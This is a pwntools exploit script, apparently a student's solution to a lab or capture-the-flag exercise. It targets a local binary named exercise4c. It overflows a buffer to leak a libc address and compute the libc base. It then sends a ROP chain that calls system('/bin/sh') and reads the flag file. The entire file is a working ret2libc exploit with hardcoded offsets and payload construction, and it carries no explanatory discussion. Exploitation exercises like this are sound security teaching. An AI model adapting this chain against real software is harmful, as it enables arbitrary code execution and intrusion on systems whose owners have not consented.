#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise4/exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# pause()
print(r.recvline())        # Enter message

r.sendline(b"A"*344)

st = r.recvline()          # Ohh really. Thanks
print(f"received_line: {st}")

func_addr = st[348: st.index(b'?')]
func_addr = func_addr + p64(0)[:8-len(func_addr)]
print(f"received_func_addr: {hex(u64(func_addr))}")
libc_base = u64(func_addr) - 0x84de5
print(f"Libc base: {hex(libc_base)}")

print(r.recvline())        # Enter message

libc_elf = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
sys_offset = libc_elf.symbols['system']
sys_addr = libc_base + sys_offset
print(f"Libc System Offset: {hex(sys_offset)}")
print(f"Libc System Address: {hex(sys_addr)}")

exit_offset = libc_elf.symbols['exit']
exit_addr = libc_base + exit_offset
print(f"Libc Exit Offset: {hex(exit_offset)}")
print(f"Libc Exit Address: {hex(exit_addr)}")

ret_addr = libc_base + 0x22679
bin_sh_addr = libc_base + 0x1b45bd
pop_rdi_addr = libc_base + 0x23b6a

payload = b"A"*392
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(bin_sh_addr)
payload += p64(sys_addr)
payload += p64(exit_addr)

print(f"Sending: {payload}")
r.sendline(payload)        # Send password

r.sendline(b'cat flag')     # Send cmd
print(r.recvline())        # FLAG